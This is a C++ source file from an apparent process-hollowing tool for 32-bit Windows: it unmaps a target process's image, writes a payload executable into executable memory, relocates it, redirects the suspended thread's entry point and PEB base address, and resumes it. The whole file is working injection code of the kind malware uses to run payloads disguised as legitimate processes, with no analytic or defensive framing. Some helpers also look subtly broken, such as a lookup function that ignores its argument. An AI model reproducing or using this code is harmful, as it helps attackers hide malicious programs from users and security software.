#include "Hollowing32Bit.hpp"
#include "NtdllFunctions.hpp"
#include <Windows.h>
#include <string>
#include <Ntsecapi.h>
#include <DbgHelp.h>
#include <stdint.h>
#include <iostream>
#include "exceptions/IncompatibleImagesException.hpp"
#include "exceptions/ImageWindowsBitnessException.hpp"
#include "exceptions/HollowingException.hpp"

const std::string RELOCATION_SECTION_NAME = ".reloc";

Hollowing32Bit::Hollowing32Bit(const std::string& targetPath, const std::string& payloadPath) :
    HollowingInterface(targetPath, payloadPath)
{
    ValidateCompatibility();
}

void Hollowing32Bit::hollow()
{
    DEBUG(std::cout << "PID: " << _targetProcessInformation.dwProcessId << std::endl);

    PEB32 targetPEB = Read32BitProcessPEB(_targetProcessInformation.hProcess);

    const PIMAGE_DOS_HEADER payloadDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(_payloadBuffer);
    const PIMAGE_NT_HEADERS32 payloadNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS32>(_payloadBuffer + payloadDOSHeader->e_lfanew);

    if (0 != NtdllFunctions::_NtUnmapViewOfSection(_targetProcessInformation.hProcess, reinterpret_cast<PVOID>(targetPEB.ImageBaseAddress)))
    {
        throw HollowingException("An error occured while unmapping the target's memory!");
    }
    PVOID targetNewBaseAddress = VirtualAllocEx(_targetProcessInformation.hProcess, reinterpret_cast<PVOID>(targetPEB.ImageBaseAddress),
        payloadNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (nullptr == targetNewBaseAddress)
    {
        throw HollowingException("An error occured while allocating new memory for the target!");
    }

    DEBUG(std::cout << "New base address: " << std::hex << targetNewBaseAddress << std::endl);

    WriteTargetProcessHeaders(targetNewBaseAddress, _payloadBuffer);

    UpdateTargetProcessEntryPoint(reinterpret_cast<PBYTE>(targetNewBaseAddress) + payloadNTHeaders->OptionalHeader.AddressOfEntryPoint);

    DWORD delta = reinterpret_cast<intptr_t>(targetNewBaseAddress) - payloadNTHeaders->OptionalHeader.ImageBase;
    DEBUG(std::cout << "Delta: " << std::hex << delta << std::endl);
    if (0 != delta)
    {
        RelocateTargetProcess(delta, targetNewBaseAddress);
        
        UpdateBaseAddressInTargetPEB(targetNewBaseAddress);
    }


    DEBUG(std::cout << "Resuming the target's main thread" << std::endl);
    
    NtdllFunctions::_NtResumeThread(_targetProcessInformation.hThread, nullptr);

    _hollowed = true;
}

void Hollowing32Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE sourceFileContents)
{
    const PIMAGE_DOS_HEADER sourceDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(sourceFileContents);
    const PIMAGE_NT_HEADERS32 sourceNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS32>(sourceFileContents + sourceDOSHeader->e_lfanew);

    DEBUG(std::cout << "Writing headers" << std::endl);
    DWORD oldProtection = 0;
    SIZE_T writtenBytes = 0;
    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, targetBaseAddress, sourceFileContents,
        sourceNTHeaders->OptionalHeader.SizeOfHeaders, &writtenBytes) || 0 == writtenBytes)
    {
        throw HollowingException("An error occured while writing the payload's headers to the target!");
    }
    // Updating the ImageBase field
    if(0 == WriteProcessMemory(_targetProcessInformation.hProcess, reinterpret_cast<LPBYTE>(targetBaseAddress) + sourceDOSHeader->e_lfanew +
        offsetof(IMAGE_NT_HEADERS32, OptionalHeader) + offsetof(IMAGE_OPTIONAL_HEADER32, ImageBase), &targetBaseAddress,
        sizeof(DWORD), &writtenBytes) || 0 == writtenBytes)
    {
        throw HollowingException("An error occured while updating the ImageBase field!");
    }
    if (0 == VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders->OptionalHeader.SizeOfHeaders,
        PAGE_READONLY, &oldProtection))
    {
        throw HollowingException("An error occured while changing the target's sections' page permissions!");
    }

    for (int i = 0; i < sourceNTHeaders->FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER currentSection = reinterpret_cast<PIMAGE_SECTION_HEADER>(sourceFileContents + sourceDOSHeader->e_lfanew +
            sizeof(IMAGE_NT_HEADERS32) + (i * sizeof(IMAGE_SECTION_HEADER)));
        
        DEBUG(std::cout << "Writing " << std::string(reinterpret_cast<char*>(currentSection->Name)) << std::endl);
        if (ERROR_SUCCESS != NtdllFunctions::_NtWriteVirtualMemory(_targetProcessInformation.hProcess, reinterpret_cast<LPBYTE>(targetBaseAddress) +
            currentSection->VirtualAddress, (sourceFileContents + currentSection->PointerToRawData),
            currentSection->SizeOfRawData, nullptr))
        {
            throw HollowingException("An error occured while writing a payload's section to the target!");
        }

        if (0 == VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders->OptionalHeader.SizeOfHeaders,
            SectionCharacteristicsToMemoryProtections(currentSection->Characteristics), &oldProtection))
        {
            throw HollowingException("An error occured while changing a section's page permissions!");
        }
    }
}

void Hollowing32Bit::UpdateTargetProcessEntryPoint(PVOID newEntryPointAddress)
{
    /* if (IsWindows64Bit())
    {
    #ifdef _WIN64
        WOW64_CONTEXT threadContext;
        threadContext.ContextFlags = WOW64_CONTEXT_ALL;

        if (0 == Wow64GetThreadContext(_targetProcessInformation.hThread, &threadContext))
        {
            throw HollowingException("An error occured while getting the target's thread context!");
        }

        threadContext.Eax = reinterpret_cast<intptr_t>(newEntryPointAddress);

        if (0 == Wow64SetThreadContext(_targetProcessInformation.hThread, &threadContext))
        {
            throw HollowingException("An error occured while setting the target's thread context!");
        }
    #else
        CONTEXT threadContext;
        threadContext.ContextFlags = CONTEXT_ALL;

        if (0 == GetThreadContext(_targetProcessInformation.hThread, &threadContext))
        {
            throw HollowingException("An error occured while getting the target's thread context!");
        }

        threadContext.Eax = reinterpret_cast<intptr_t>(newEntryPointAddress);

        if (0 == SetThreadContext(_targetProcessInformation.hThread, &threadContext))
        {
            throw HollowingException("An error occured while setting the target's thread context!");
        }
    #endif
    }
    else
    {
        CONTEXT threadContext;
        threadContext.ContextFlags = CONTEXT_ALL;

        if (0 == GetThreadContext(_targetProcessInformation.hThread, &threadContext))
        {
            throw HollowingException("An error occured while getting the target's thread context!");
        }

        threadContext.Eax = reinterpret_cast<intptr_t>(newEntryPointAddress);

        if (0 == SetThreadContext(_targetProcessInformation.hThread, &threadContext))
        {
            throw HollowingException("An error occured while setting the target's thread context!");
        }
    } */

    CONTEXT32 threadContext = Get32BitProcessThreadContext(_targetProcessInformation.hThread);

    threadContext.Eax = reinterpret_cast<intptr_t>(newEntryPointAddress);

    Set32BitProcessThreadContext(_targetProcessInformation.hThread, threadContext);
}

PIMAGE_DATA_DIRECTORY Hollowing32Bit::GetPayloadDirectoryEntry(DWORD directoryID)
{
    PIMAGE_DOS_HEADER payloadDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(_payloadBuffer);
    PIMAGE_NT_HEADERS32 payloadNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS32>(_payloadBuffer + payloadDOSHeader->e_lfanew);

    return &(payloadNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
}

PIMAGE_SECTION_HEADER Hollowing32Bit::FindTargetProcessSection(const std::string& sectionName)
{
    IMAGE_DOS_HEADER payloadDOSHeader = *((PIMAGE_DOS_HEADER)_payloadBuffer);
    IMAGE_NT_HEADERS32 payloadNTHeaders = *((PIMAGE_NT_HEADERS32)(_payloadBuffer + payloadDOSHeader.e_lfanew));
    char maxNameLengthHolder[IMAGE_SIZEOF_SHORT_NAME + 1] = { 0 };  // According to WinAPI, the name of the section can
                                                                    // be as long as the size of the buffer, which means
                                                                    // it won't always have a terminating null byte, so
                                                                    // we include a spot for one at the end by ourselves.

    for (int i = 0; i < payloadNTHeaders.FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER currentSectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(_payloadBuffer + payloadDOSHeader.e_lfanew +
            sizeof(IMAGE_NT_HEADERS32) + (i * sizeof(IMAGE_SECTION_HEADER)));

        if (0 != currentSectionHeader->Name[IMAGE_SIZEOF_SHORT_NAME - 1])
        {
            strncpy(maxNameLengthHolder, reinterpret_cast<char*>(currentSectionHeader->Name), IMAGE_SIZEOF_SHORT_NAME);
        }
        else
        {
            int nameLength = strlen(reinterpret_cast<char*>(currentSectionHeader->Name));
            strncpy(maxNameLengthHolder, reinterpret_cast<char*>(currentSectionHeader->Name), nameLength);
            maxNameLengthHolder[nameLength] = 0;
        }

        if (0 == strcmp(sectionName.c_str(), maxNameLengthHolder))
        {
            return currentSectionHeader;
        }
    }

    return nullptr;
}

void Hollowing32Bit::RelocateTargetProcess(ULONGLONG baseAddressesDelta, PVOID processBaseAddress)
{
    PIMAGE_DATA_DIRECTORY relocData = GetPayloadDirectoryEntry(IMAGE_DIRECTORY_ENTRY_BASERELOC);
    DWORD dwOffset = 0;
    PIMAGE_SECTION_HEADER relocSectionHeader = FindTargetProcessSection(RELOCATION_SECTION_NAME);

    if (nullptr == relocSectionHeader)
    {
        throw HollowingException("The payload must have a relocation section!");
    }

    DWORD dwRelocAddr = relocSectionHeader->PointerToRawData;

    while (dwOffset < relocData->Size)
    {
        PBASE_RELOCATION_BLOCK pBlockHeader = reinterpret_cast<PBASE_RELOCATION_BLOCK>(&_payloadBuffer[dwRelocAddr + dwOffset]);
        DWORD dwEntryCount = CountRelocationEntries(pBlockHeader->BlockSize);
        PBASE_RELOCATION_ENTRY pBlocks = reinterpret_cast<PBASE_RELOCATION_ENTRY>(&_payloadBuffer[dwRelocAddr + dwOffset + sizeof(BASE_RELOCATION_BLOCK)]);

        ProcessTargetRelocationBlock(pBlockHeader, pBlocks, processBaseAddress, baseAddressesDelta);

        dwOffset += pBlockHeader->BlockSize;
    }
}

void Hollowing32Bit::ProcessTargetRelocationBlock(PBASE_RELOCATION_BLOCK baseRelocationBlock, PBASE_RELOCATION_ENTRY blockEntries,
    PVOID processBaseAddress, ULONGLONG baseAddressesDelta)
{
    DWORD entriesAmount = CountRelocationEntries(baseRelocationBlock->BlockSize);

    for (DWORD i = 0; i < entriesAmount; i++)
    {
        // The base relocation is skipped. This type can be used to pad a block.
        if (IMAGE_REL_BASED_ABSOLUTE != blockEntries[i].Type)
        {
            DWORD dwFieldAddress = baseRelocationBlock->PageAddress + blockEntries[i].Offset;
            DWORD addressToFix = 0;
            SIZE_T readBytes = 0;
            if(0 == ReadProcessMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(processBaseAddress) + dwFieldAddress),
                &addressToFix, sizeof(addressToFix), &readBytes) || sizeof(addressToFix) != readBytes)
            {
                throw HollowingException("An error occured while reading the address to relocate from the target!");
            }
            
            addressToFix += static_cast<DWORD>(baseAddressesDelta);

            SIZE_T writtenBytes = 0;
            if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(processBaseAddress) + dwFieldAddress),
                &addressToFix, sizeof(addressToFix), &writtenBytes) || sizeof(addressToFix) != writtenBytes)
            {
                throw HollowingException("An error occured while writing the relocated address to the target!");
            }
        }
    }
}

void Hollowing32Bit::UpdateBaseAddressInTargetPEB(PVOID processNewBaseAddress)
{
    /* WOW64_CONTEXT threadContext;
    threadContext.ContextFlags = WOW64_CONTEXT_ALL;

    if (0 == Wow64GetThreadContext(_targetProcessInformation.hThread, &threadContext))
    {
        throw HollowingException("An error occured while getting the target's thread context!");
    }

    SIZE_T writtenBytes = 0;
    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, reinterpret_cast<PVOID>(threadContext.Ebx + offsetof(PEB32, ImageBaseAddress)),
        &processNewBaseAddress, sizeof(DWORD), &writtenBytes) || sizeof(DWORD) != writtenBytes)
    {
        throw HollowingException("An error occured while writing the new base address in the target's PEB!");
    } */

    CONTEXT32 threadContext = Get32BitProcessThreadContext(_targetProcessInformation.hThread);
    SIZE_T writtenBytes = 0;
    
    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, reinterpret_cast<PVOID>(threadContext.Ebx + offsetof(PEB32, ImageBaseAddress)),
        &processNewBaseAddress, sizeof(DWORD), &writtenBytes) || sizeof(DWORD) != writtenBytes)
    {
        throw HollowingException("An error occured while writing the new base address in the target's PEB!");
    }
}

ULONG Hollowing32Bit::GetProcessSubsystem(HANDLE process)
{
    PEB32 processPEB = Read32BitProcessPEB(process);
    
    return processPEB.ImageSubsystem;
}

WORD Hollowing32Bit::GetPEFileSubsystem(const PBYTE fileBuffer)
{
    PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(fileBuffer);
    PIMAGE_NT_HEADERS64 ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(fileBuffer + dosHeader->e_lfanew);
    
    return ntHeaders->OptionalHeader.Subsystem;
}

bool Hollowing32Bit::ValidateCompatibility()
{
    WORD payloadSubsystem = GetPEFileSubsystem(_payloadBuffer);

    return (!_isTarget64Bit && !_isPayload64Bit) && ((IMAGE_SUBSYSTEM_WINDOWS_GUI == payloadSubsystem) ||
        (payloadSubsystem == GetProcessSubsystem(_targetProcessInformation.hProcess)));
}